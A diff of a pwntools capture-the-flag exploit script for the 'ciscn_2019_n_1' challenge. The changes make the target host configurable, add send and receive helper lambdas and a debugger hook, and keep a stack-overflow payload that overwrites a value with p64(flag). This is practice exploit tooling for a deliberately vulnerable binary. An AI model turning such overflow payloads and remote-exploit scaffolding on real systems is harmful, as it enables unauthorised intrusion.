@@ -3,24 +3,39 @@
 
 from pwn import *
 
+context.log_level = 'debug'
+context.arch = 'amd64'
+
 local_file  = './ciscn_2019_n_1'
 local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
 remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'
-remote_host  = 'node3.buuoj.cn'
-remote_port = 28998
 
-DEBUG = False 
-# DEBUG = True
+if len(sys.argv) == 1:
+    p = process(local_file)
+    libc = ELF(local_libc)
+elif len(sys.argv) > 1:
+    host, port = sys.argv[1].split(":")
+    if len(sys.argv) == 3:
+        host = sys.argv[1]
+        port = sys.argv[2]
+    p = remote(host, port)
+    libc = ELF(remote_libc)
 
-if DEBUG:
-	p = process(local_file)
-	libc = ELF(local_libc)
-else: 
-	p = remote(remote_host,remote_port)
-	libc = ELF(remote_libc)
 elf = ELF(local_file)
 
-context.log_level = 'debug'
+se      = lambda data               :p.send(data) 
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+sea     = lambda delim,data         :p.sendafter(delim, data)
+rc      = lambda numb=4096          :p.recv(numb)
+ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, '\0'))
+uu64    = lambda data               :u64(data.ljust(8, '\0'))
+info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
+
+def debug(cmd=''):
+	gdb.attach(p,cmd)
 
 # info
 # gadget
@@ -34,6 +49,7 @@ payload = 'A'*len
 payload += p64(flag)
 
 p.recvuntil("Let's guess the number.\n")
+# debug()
 p.sendline(payload)
 
 # gdb.attach(p)
